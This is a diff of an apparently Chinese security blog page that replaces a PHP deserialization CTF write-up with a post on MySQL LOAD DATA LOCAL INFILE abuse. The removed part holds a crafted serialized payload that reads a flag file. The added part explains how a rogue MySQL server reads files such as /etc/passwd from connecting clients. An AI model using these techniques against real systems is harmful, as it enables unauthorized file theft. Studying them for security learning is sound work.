@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>序列化与反序列化 | Hexo</title>
-  <meta name="keywords" content=" serialize , php ">
-  <meta name="description" content="序列化与反序列化 | Hexo">
+  <title>MYSQL LOAD DATA | Hexo</title>
+  <meta name="keywords" content=" mysql load data ">
+  <meta name="description" content="MYSQL LOAD DATA | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="redis协议分析tcpdump抓包 tcpdump -i lo port 6379 -w redis.pcap在redis执行如下命令 127.0.0.1:6379&amp;gt; set name test OK 127.0.0.1:6379&amp;gt; get name &amp;quot;test&amp;quot; 127.0.0.1:6379&amp;gt; RESP协议RESP在Redis中用作请求-响应协议的方式">
 <meta name="keywords" content="redis,ssrf">
@@ -517,9 +517,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-序列化与反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-MySQL LOAD DATA" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">序列化与反序列化</h1>
+        <h1 class="article-title">MYSQL LOAD DATA</h1>
     
     <div class="article-meta">
         
@@ -534,16 +534,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">serialize</a>
-            
-            <a href="javascript:" class="color4">php</a>
+            <a href="javascript:" class="color1">mysql load data</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-10 15:52:56'>2019-03-23 15:13</time>
+        创建时间:<time class="date" title='更新时间: 2019-08-10 15:51:03'>2019-08-07 22:14</time>
         
     </div>
     <div class="article-meta">
@@ -565,7 +563,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01为什么要序列化"><span class="toc-text">0x01为什么要序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#魔法函数"><span class="toc-text">魔法函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞产生"><span class="toc-text">漏洞产生</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-Return-Oriented-programming-链"><span class="toc-text">ROP(Return-Oriented programming)链</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#配置mysql"><span class="toc-text">配置mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#启动mysql服务"><span class="toc-text">启动mysql服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#设置密码"><span class="toc-text">设置密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#抓包"><span class="toc-text">抓包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LOAD-DATA-INFILE"><span class="toc-text">LOAD DATA INFILE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#伪造服务端"><span class="toc-text">伪造服务端</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -580,146 +578,51 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>老生长谈了，可是我还是不会</p>
-<a id="more"></a>
+        <a id="more"></a>
+<h1 id="配置mysql"><a href="#配置mysql" class="headerlink" title="配置mysql"></a>配置mysql</h1><h2 id="启动mysql服务"><a href="#启动mysql服务" class="headerlink" title="启动mysql服务"></a>启动mysql服务</h2><pre><code>service mysql start
 
-<h2 id="0x01为什么要序列化"><a href="#0x01为什么要序列化" class="headerlink" title="0x01为什么要序列化"></a>0x01为什么要序列化</h2><p>php允许保存一个对象方便以后重用，这个过程称为序列化。在传递变量的过程中有可能遇到变量值跨脚本传输的过程。比如文件结构是这样的：</p>
-<p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kawe13ecj305w03nt8i.jpg" alt></p>
-<p>其中index.php代码如下：</p>
-<pre><code>&lt;?php 
-@highlight_file(__FILE__);
-require_once(&#39;shield.php&#39;);
-$x = new Shield();
-isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
-if (!empty($g)) {
-    $x = unserialize($g);
-}
-echo $x-&gt;readfile();
-?&gt;</code></pre><p>可以看出来$x就是跨脚本传输的变量。</p>
-<p>如果在一个脚本调用跨脚本传输的变量之前，前一个包含该变量的脚本已经执行结束所有的变量和内容都已经释放掉了，这时，我们不能让前一个脚本不断循环执行等待后面的脚本去调用。serialize和unserialize 就是解决这一问题的。serialize将变量转换为字符串并且在转换过程中保存当前变量的值;unserialize则将serialize生成的字符串变回成变量。</p>
-<p>看一个例子，简单的分析一下：</p>
-<pre><code>&lt;?php
-class Test
-{
-public $age = 0;
-public $name = &#39;brain&#39;;
+MariaDB [mysql]&gt; create database test;
 
-public function PrintInfo()
-{
-    echo &#39;[+]User: &#39;.$this-&gt;name .&#39;: is&#39; . $this-&gt;age .&#39;years old.&#39;;
-}
-}
-$user =  new Test();
-$user-&gt;age = 20;
-$user-&gt;name = &#39;Jack&#39;;
-$user-&gt;PrintInfo();
-echo serialize($user);
+MariaDB [test]&gt; create table users(
+    -&gt; id int auto_increment primary key,
+    -&gt; username varchar(30),
+    -&gt; password varchar(30));
+Query OK, 0 rows affected (0.026 sec)
 
-?&gt;</code></pre><p>输出结果如下</p>
-<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kawi4ovpj30p204wdg5.jpg" alt></p>
-<p>使用unserialize则会使这串<strong>字符串</strong>恢复成<strong>类对象</strong>。</p>
-<h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>一共有几个魔法函数需要注意，这是例子：</p>
-<pre><code>&lt;?php
-class Test
-{
-public $variable = &quot;BRAIN&quot;;
-public $variable1 = &quot;BRAVO&quot;;
-public function PrintVariable()
-{
-    echo $this-&gt;variable . &#39;&lt;br /&gt;&#39;;
-}
-public function __construct()
-{
-    echo &#39;__construct&#39;.&#39;&lt;br&gt;&#39;;
-}
-public function __destruct()
-{
-    echo &#39;__destruct&lt;br /&gt;&#39;;
-}
-public function __wakeup()
-{
-    echo &#39;__wakeup&lt;br /&gt;&#39;;
-}
-public function __sleep()
-{
-    echo &#39;__sleep&lt;br /&gt;&#39;;
-    return array(&#39;variable&#39; , &#39;variable1&#39;);
-}
-}    
-$obj = new Test();  //创建对象时调用__construct
-
-$serialized = serialize($obj); //序列化对象时调用__sleep
-
-print(&#39;Serialized: &#39;.$serialized . &#39;&lt;br /&gt;&#39;);
-
-$obj2 = unserialize($serialized); //重建对象调用 __wakeup
-
-$obj2-&gt;PrintVariable(); //调用方法输出数据
-//脚本结束调用__destruct
-?&gt;</code></pre><p>这是执行结果：</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kawmc729j30h504a746.jpg" alt></p>
-<p>可以看到各个函数的执行顺序。</p>
-<h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><p>反序列化的危害就在于反序列化后的字符串参数被用户可控，从而在序列化之后造成不可预料的问题。</p>
-<p>拿一道ctf题举例，文件结构就是文章开头提到的结构</p>
-<pre><code>    idnex.php
-
-&lt;?php 
-@highlight_file(__FILE__);
-require_once(&#39;shield.php&#39;);
-$x = new Shield();
-isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
-if (!empty($g)) {
-    $x = unserialize($g);
-}
-echo $x-&gt;readfile();
-?&gt;
-
-
-shield.php
-
-&lt;?php
-//flag is in pctf.php
-class Shield {
-    public $file;
-    function __construct($filename = &#39;&#39;) {
-        $this -&gt; file = $filename;
-    }
-    function readfile() {
-        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
-        &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
-            return @file_get_contents($this-&gt;file);
-        }
-    }
-}
-?&gt;</code></pre><p>我们可以看到index.php中先包含了shield.php，然后创建了一个新对象，在判断完get的变量之后进行反序列化，随后调用readfile()函数。<br>在shield.php中提示flag在pctf.php中，随后在readfile()函数中对$file进行一定过滤之后读文件内容。</p>
-<p>我们的想法就是控制$file的值为pctf.php</p>
-<pre><code>&lt;?php
-//flag is in pctf.php
-class Shield {
-    public $file;
-    function __construct($filename = &#39;&#39;) {
-        $this -&gt; file = $filename;
-    }
-    function readfile() {
-        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
-        &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
-            return @file_get_contents($this-&gt;file);
-        }
-    }
-}
-$a = new Shield(&quot;pctf.php&quot;);
-echo serialize($a);
-?&gt;
-序列化结果
-O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>然后我们就可以尝试传入这个字符串</p>
-<pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>就可以在源码中看到flag.</p>
-<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kawpcjn0j30br08twep.jpg" alt></p>
-<h2 id="ROP-Return-Oriented-programming-链"><a href="#ROP-Return-Oriented-programming-链" class="headerlink" title="ROP(Return-Oriented programming)链"></a>ROP(Return-Oriented programming)链</h2><p>这道题的攻击链比较简单。当我们传入序列化完成的字符串后，程序先对其反序列化生成一个对象，这时没有_wakeup()，_destruct()魔法函数，只是简单的反序列化，之后调用readfile()函数进行$file的内容的读取，而我们将$file的值设置为了pctf.php，于是我们得到了该文件的内容。<br>反序列化漏洞需要两个条件：</p>
+MariaDB [test]&gt; insert into users (id,username,password) values (1,&quot;admin&quot;,&quot;admin&quot;);</code></pre><h2 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h2><pre><code>use mysql
+update user set password=PASSWORD(&#39;admin&#39;) where User=&#39;root&#39;;
+flush privileges;
+quit
+service mysql restart
+mysql -h 127.0.0.1 -u root -p  #如果tcpdump抓不到包就尝试设置 -h参数指定为本地回环地址</code></pre><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><pre><code>tcpdump -i lo port 3306 -w test.cap</code></pre><p>tcpdump使用指南：<a href="https://www.cnblogs.com/pyng/p/9698723.html" title="tcpdump使用" target="_blank" rel="noopener">https://www.cnblogs.com/pyng/p/9698723.html</a></p>
+<h1 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a>LOAD DATA INFILE</h1><p>load data infile 主要是读取一个文件的内容并且放到一个表中，通常有两种用法</p>
+<pre><code>load data infile &quot;/data/data.csv&quot; into table TestTable fields terminated by &#39;分隔符;            //读取服务器文件
+load data local infile &quot;/home/lightless/data.csv&quot; into table TestTable fields terminated by &#39;分隔符; //读取本地文件</code></pre><p>查看官方文档<br><img src="https://upload-images.jianshu.io/upload_images/9113969-2c46042011a696ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>我们读取本地文件，并抓取3306端口流量分析</p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5rdhx9h84j30jx02lt9b.jpg" alt="读取本地文件 test.txt"></p>
+<p>文件内容是 <code>hello world!</code></p>
+<p>抓取流量</p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5rdhzvg9vj30k602n0u2.jpg" alt="抓取3306端口流量"></p>
+<p>丢进wireshark</p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5rdi51lqsj30l20kz77j.jpg" alt="客户端请求服务器"></p>
+<p>第一个包看起来比较正常，是客户端发起的<code>Request Query</code>，如果你无法使用<code>LOAD DATA INFILE</code>语法的话，考虑在连接 <code>MySQL</code> 的时候加上<code>--enable-local-infile</code>选项，或者设置<code>local_infile</code>全局变量为<code>ON</code>。我们可以看到第一个数据包是客户端发送的请求包，包含了请求命令。</p>
+<p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5rdi2fq31j30kd0cgjt2.jpg" alt="服务器应答"></p>
+<p>服务器对请求做出响应，响应内容包含了文件名。</p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5rdi7lfm1j30kx0dyjtf.jpg" alt="客户端发出请求，发送文件内容"></p>
+<p>客户端发送服务器返回的文件名的文件内容给服务器。</p>
+<p>于是我们想到，如果我们在客户端发送查询之后，返回一个Response TABULAR数据包，并附上我们指定的文件，是不是就可以读取客户端的文件了，答案是肯定的。引用大佬<a href="https://lightless.me/archives/read-mysql-client-file.html" title="大佬" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a>的文章</p>
 <blockquote>
-<p>1.存在序列化字符串的可控制点或者说是输入点</p>
-<p>2.存在可以利用的魔法函数</p>
+<pre><code>客户端：hi~ 我将把我的 data.csv 文件给你插入到 test 表中！
+服务端：OK，读取你本地 data.csv 文件并发给我！
+客户端：这是文件内容：balabal！</code></pre><p>正常情况下，这个流程不会有什么问题，但是如果我们制作了恶意的客户端，并且回复服务端任意一个我们想要获取的文件，那么情况就不一样了。</p>
+<pre><code>客户端：hi~ 我将把我的 data.csv 文件给你插入到 test 表中！
+服务端：OK，读取你本地的 / etc/passwd 文件并发给我！
+客户端：这是文件内容：balabal（/etc/passwd 文件的内容）！</code></pre></blockquote>
+<p>伪造的服务端可以在任何时候回复一个 file-transfer 请求，不一定非要是在LOAD DATA LOCAL的时候。</p>
+<h1 id="伪造服务端"><a href="#伪造服务端" class="headerlink" title="伪造服务端"></a>伪造服务端</h1><p>利用github上项目： <a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
+<p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a><br><a href="https://xz.aliyun.com/t/3277" target="_blank" rel="noopener">https://xz.aliyun.com/t/3277</a><br><a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/</a><br><a href="https://xz.aliyun.com/t/3973" target="_blank" rel="noopener">https://xz.aliyun.com/t/3973</a></p>
 </blockquote>
-<p>这道题目对魔法函数的利用好像不是很明显.(ε=ε=ε=┏(゜ロ゜;)┛)</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 brainsemail@163.com </span>
@@ -733,12 +636,12 @@ O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>序列化与反序列化</p>
+    <p><span class="copy-title">文章标题:</span>MYSQL LOAD DATA</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="Luc1fer">Luc1fer</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-03-23, 15:13:47</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-10, 15:52:56</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/03/23/序列化与反序列化/" title="序列化与反序列化">https://github.com/BrainLyh/2019/03/23/序列化与反序列化/</a>
+    <p><span class="copy-title">发布时间:</span>2019-08-07, 22:14:02</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-10, 15:51:03</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/07/MySQL LOAD DATA/" title="MYSQL LOAD DATA">https://github.com/BrainLyh/2019/08/07/MySQL LOAD DATA/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
